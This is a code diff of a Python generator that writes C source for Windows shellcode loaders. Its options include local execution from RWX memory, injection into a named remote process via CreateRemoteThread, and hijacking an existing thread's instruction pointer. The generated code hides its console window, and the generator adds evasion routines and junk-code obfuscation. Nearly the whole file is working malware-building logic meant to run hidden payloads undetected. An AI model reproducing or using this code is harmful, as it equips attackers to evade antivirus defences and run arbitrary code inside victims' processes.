@@ -1,157 +1,131 @@
-from lib import core, evasion, decoy, junk, postexploit
-from random import shuffle
+from lib import core, evasion
 
 
-def exercise_room(injection_type, processname, vShellcode, decoder_stub, architecture, junkcode, intensity, evasions, decoys, windows_firewall, windows_update, filename):
+def exercise_room(arch, inject_type, procname, filename, junkcode, sleep, vshellcode, decoder_stub):
     exec_code = ""
-    evasion_code = ""
-    junkfunc_code = ""
-    top_funcname_code = ""
-    evasion_funcname, evasion_func = evasion.the_great_evasion(evasions, architecture, filename, junkcode, intensity)
-    junkfuncname, junkcode_func = junk.junk_inject(junkcode, "func", intensity)
-    decoy_code = decoy.fake_u(decoys, junkcode, intensity)
-    xor_func, exec_stub = postexploit.hidden_forever(windows_firewall, windows_update, junkcode, intensity)
+    raw_code = ""
     final_code = ""
+    if inject_type == "local":
+        exec_code += local_ti(vshellcode, decoder_stub)
+        raw_code += body_builder(arch, filename, sleep, exec_code)
 
-    if injection_type == "local":
+    elif inject_type == "remote":
+        exec_code += remote_ti(procname, vshellcode, decoder_stub)
+        raw_code += body_builder(arch, filename, sleep, exec_code)
 
-        if junkcode == "yes":
-            junkfunc_code += junkcode_func
-            top_funcname_code += junkfuncname
-            core.junkcode_added()
-            core.junkfunc_added()
+    elif inject_type == "hijack":
+        exec_code += remote_pth(procname, vshellcode, decoder_stub, arch)
+        raw_code += body_builder(arch, filename, sleep, exec_code)
 
-        if evasions == "yes":
-            evasion_code += evasion_func
-            top_funcname_code += evasion_funcname
-            core.evasion_added()
+    if junkcode == "yes":
+        final_code += evasion.junk_inject(raw_code)
+    else:
+        final_code += raw_code
 
-        exec_code += local_thread_injection(vShellcode, decoder_stub, junkcode, intensity)
-        final_code += body_builder(evasion_code, junkfunc_code, top_funcname_code, exec_code, decoy_code, xor_func, exec_stub, junkcode, intensity)
-
-    elif injection_type == "remote":
-
-        if junkcode == "yes":
-            junkfunc_code += junkcode_func
-            top_funcname_code += junkfuncname
-            core.junkcode_added()
-            core.junkfunc_added()
-
-        if evasions == "yes":
-            evasion_code += evasion_func
-            top_funcname_code += evasion_funcname
-            core.evasion_added()
-
-        if processname != "":
-            exec_code += remote_thread_injection(processname, vShellcode, decoder_stub, junkcode, intensity)
-            final_code += body_builder(evasion_code, junkfunc_code, top_funcname_code, exec_code, decoy_code, xor_func, exec_stub, junkcode, intensity)
-
-        else:
-            processname = "explorer.exe"
-            exec_code += remote_thread_injection(processname, vShellcode, decoder_stub, junkcode, intensity)
-            final_code += body_builder(evasion_code, junkfunc_code, top_funcname_code, exec_code, decoy_code, xor_func, exec_stub, junkcode, intensity)
-
+    final_code = headers() + final_code
     return final_code
 
 
-def body_builder(evasion_code, junkfunc_code, top_funcname_code, exec_code, decoy_code, xor_func, exec_stub, junkcode, intensity):
-    final_code = headers()
-    final_code += junkfunc_code
-    final_code += xor_func
-    final_code += evasion_code
-    final_code += main()
-    final_code += exec_stub
-    top_funcname_code = shuffle_funcname(top_funcname_code, junkcode, intensity)
-    final_code += top_funcname_code
-    final_code += decoy_code
-    final_code += exec_code
-    return final_code
-
-
-def shuffle_funcname(top_funcname_code, junkcode, intensity):
-    top_funcname_code = top_funcname_code.splitlines()
-    shuffle(top_funcname_code)
-    new_line = ""
-
-    for line in top_funcname_code:
-        line += "\n"
-        new_line += line
-        if junkcode == "yes":
-            new_line += junk.junk_inject(junkcode, "code", intensity)
-
-    return new_line
+def body_builder(arch, filename, sleep, exec_code):
+    raw_code = main()
+    raw_code += evasion.the_great_evasion(arch, filename)
+    raw_code += sleep
+    raw_code += exec_code
+    return raw_code
 
 
 def headers():
-    header = "#include <windows.h>\n"
-    header += "#include <memoryapi.h>\n"
-    header += "#include <tlhelp32.h>\n"
-    header += "#include <stdio.h>\n"
-    header += "#include <stdlib.h>\n"
-    header += "#include <time.h>\n"
-    header += "#include <cmath>\n"
-    return header
+    header = ["#include <windows.h>\n", "#include <memoryapi.h>\n", "#include <tlhelp32.h>\n", "#include <stdio.h>\n", "#include <stdlib.h>\n", "#include <time.h>\n", "#include <math.h>\n", '#include <psapi.h>\n']
+    lheaders = ""
+    for i in header:
+        lheaders += i
+    return lheaders
 
 
 def main():
     hWnd = core.varname_creator()
-    hw = "int main(int argc, char **argv){\n"
-    hw += "HWND " + hWnd + " = GetConsoleWindow();\n"
-    hw += "ShowWindow(" + hWnd + ", SW_HIDE);\n\n"
+    hw = "int main(int argc, char * argv[]){"
+    hw += f"HWND {hWnd} = GetConsoleWindow();"
+    hw += f"ShowWindow({hWnd}, SW_HIDE);\n"
     return hw
 
 
-def local_thread_injection(vShellcode, decoder_stub, junkcode, intensity):
+def local_ti(vshellcode, decoder_stub):
     execs = core.varname_creator()
     lti = decoder_stub
-    lti += junk.junk_inject(junkcode, "code", intensity)
-    lti += "\nvoid *" + execs + " = VirtualAlloc(0, sizeof " + vShellcode + ", MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n"
-    lti += junk.junk_inject(junkcode, "code", intensity)
-    lti += "memcpy(" + execs + ", " + vShellcode + ", sizeof " + vShellcode + ");\n"
-    lti += junk.junk_inject(junkcode, "code", intensity)
-    lti += "((void(*)())" + execs + ")();\n"
-    lti += "}\n"
+    lti += f"\nvoid *{execs} = VirtualAlloc(0, sizeof {vshellcode}, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n"
+    lti += f"memcpy({execs}, {vshellcode}, sizeof {vshellcode});\n"
+    lti += f"((void(*)()){execs})();\n"
+    lti += "}"
     return lti
 
 
-def remote_thread_injection(processname, vShellcode, decoder_stub, junkcode, intensity):
+def remote_ti(procname, vshellcode, decoder_stub):
     entry = core.varname_creator()
     snapshot = core.varname_creator()
     process_handle = core.varname_creator()
     remote_thread = core.varname_creator()
     remote_buffer = core.varname_creator()
     rti = decoder_stub
-    rti += junk.junk_inject(junkcode, "code", intensity)
-    rti += "\nPROCESSENTRY32 " + entry + ";\n"
-    rti += junk.junk_inject(junkcode, "code", intensity)
-    rti += entry + ".dwSize = sizeof(PROCESSENTRY32);\n"
-    rti += junk.junk_inject(junkcode, "code", intensity)
-    rti += "HANDLE " + snapshot + " = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n"
-    rti += junk.junk_inject(junkcode, "code", intensity)
-    rti += "if (Process32First(" + snapshot + ", &" + entry + ") == TRUE)\n"
-    rti += "{\n"
-    rti += junk.junk_inject(junkcode, "code", intensity)
-    rti += "while (Process32Next(" + snapshot + ", &" + entry + ") == TRUE)\n"
-    rti += "{\n"
-    rti += junk.junk_inject(junkcode, "code", intensity)
-    rti += 'if (stricmp(' + entry + '.szExeFile, ' + '"' + processname + '"' + ') == 0)'
-    rti += '{\n'
-    rti += junk.junk_inject(junkcode, "code", intensity)
-    rti += "HANDLE " + process_handle + ";\n"
-    rti += junk.junk_inject(junkcode, "code", intensity)
-    rti += "HANDLE " + remote_thread + ";\n"
-    rti += junk.junk_inject(junkcode, "code", intensity)
-    rti += "PVOID " + remote_buffer + ";\n"
-    rti += junk.junk_inject(junkcode, "code", intensity)
-    rti += process_handle + " = OpenProcess(PROCESS_ALL_ACCESS, FALSE, " + entry + ".th32ProcessID);\n"
-    rti += junk.junk_inject(junkcode, "code", intensity)
-    rti += remote_buffer + " = VirtualAllocEx(" + process_handle + ", NULL, sizeof " + vShellcode + ", (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);\n"
-    rti += junk.junk_inject(junkcode, "code", intensity)
-    rti += "WriteProcessMemory(" + process_handle + ", " + remote_buffer + ", " + vShellcode + ", sizeof " + vShellcode + ", NULL);\n"
-    rti += junk.junk_inject(junkcode, "code", intensity)
-    rti += remote_thread + " = CreateRemoteThread(" + process_handle + ", NULL, 0, (LPTHREAD_START_ROUTINE)" + remote_buffer + ", NULL, 0, NULL);\n"
-    rti += junk.junk_inject(junkcode, "code", intensity)
-    rti += "CloseHandle(" + process_handle + ");}}}\n"
-    rti += "CloseHandle(" + snapshot + ");"
-    rti += "}\n"
+    rti += f"\nPROCESSENTRY32 {entry};\n"
+    rti += f"{entry}.dwSize = sizeof(PROCESSENTRY32);\n"
+    rti += f"HANDLE {snapshot} = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);"
+    rti += f"if (Process32First({snapshot}, &{entry}) == TRUE)" + "{"
+    rti += f"while (Process32Next({snapshot}, &{entry}) == TRUE)" + "{"
+    rti += f'if (stricmp({entry}.szExeFile, "{procname}") == 0)' + "{\n"
+    rti += f"HANDLE {process_handle};\n"
+    rti += f"HANDLE {remote_thread};\n"
+    rti += f"PVOID {remote_buffer};\n"
+    rti += f"{process_handle} = OpenProcess(PROCESS_ALL_ACCESS, FALSE, " + entry + ".th32ProcessID);\n"
+    rti += f"{remote_buffer} = VirtualAllocEx({process_handle}, NULL, sizeof {vshellcode}, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);\n"
+    rti += f"WriteProcessMemory({process_handle}, {remote_buffer}, {vshellcode}, sizeof {vshellcode}, NULL);\n"
+    rti += f"{remote_thread} = CreateRemoteThread({process_handle}, NULL, 0, (LPTHREAD_START_ROUTINE){remote_buffer}, NULL, 0, NULL);\n"
+    rti += f"CloseHandle({process_handle});"
+    rti += "}}}"
+    rti += f"CloseHandle({snapshot});"
+    rti += "}"
     return rti
+
+
+def remote_pth(procname, vshellcode, decoder_stub, arch):
+    entry = core.varname_creator()
+    snapshot0 = core.varname_creator()
+    targetProcessHandle = core.varname_creator()
+    remoteBuffer = core.varname_creator()
+    threadHijacked = core.varname_creator()
+    snapshot1 = core.varname_creator()
+    threadEntry = core.varname_creator()
+    context = core.varname_creator()
+    contextArch = "Rip"
+    if arch == "x86":
+        contextArch = "Eip"
+    rpth = decoder_stub
+    rpth += f"\nPROCESSENTRY32 {entry};"
+    rpth += f"{entry}.dwSize = sizeof(PROCESSENTRY32);"
+    rpth += f"HANDLE {snapshot0} = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);"
+    rpth += f"if (Process32First({snapshot0}, &{entry}) == TRUE)" + "{"
+    rpth += f"while (Process32Next({snapshot0}, &{entry}) == TRUE)" + "{"
+    rpth += f'if (stricmp({entry}.szExeFile, "{procname}") == 0)' + "{"
+    rpth += f"HANDLE {targetProcessHandle};"
+    rpth += f"PVOID {remoteBuffer};"
+    rpth += f"HANDLE {threadHijacked }= NULL;"
+    rpth += f"HANDLE {snapshot1};"
+    rpth += f"THREADENTRY32 {threadEntry};"
+    rpth += f"CONTEXT {context};"
+    rpth += f"{context}.ContextFlags = CONTEXT_FULL;"
+    rpth += f"{threadEntry}.dwSize = sizeof(THREADENTRY32);"
+    rpth += f"{targetProcessHandle} = OpenProcess(PROCESS_ALL_ACCESS, FALSE, {entry}.th32ProcessID);"
+    rpth += f"{remoteBuffer} = VirtualAllocEx({targetProcessHandle}, NULL, sizeof {vshellcode}, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);"
+    rpth += f"WriteProcessMemory({targetProcessHandle}, {remoteBuffer}, {vshellcode}, sizeof {vshellcode}, NULL);"
+    rpth += f"{snapshot1} = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);"
+    rpth += f"Thread32First({snapshot1}, &{threadEntry});"
+    rpth += f"while (Thread32Next({snapshot1}, &{threadEntry}))" + "{"
+    rpth += f"if ({threadEntry}.th32OwnerProcessID == {entry}.th32ProcessID)" + "{"
+    rpth += f"{threadHijacked} = OpenThread(THREAD_ALL_ACCESS, FALSE, {threadEntry}.th32ThreadID);" + "break;}}"
+    rpth += f"SuspendThread({threadHijacked});"
+    rpth += f"GetThreadContext({threadHijacked}, &{context});"
+    rpth += f"{context}.{contextArch} = (DWORD_PTR){remoteBuffer};"
+    rpth += f"SetThreadContext({threadHijacked}, &{context});"
+    rpth += f"ResumeThread({threadHijacked});" + "}}}"
+    rpth += f"CloseHandle({snapshot0});" + "}"
+    return rpth
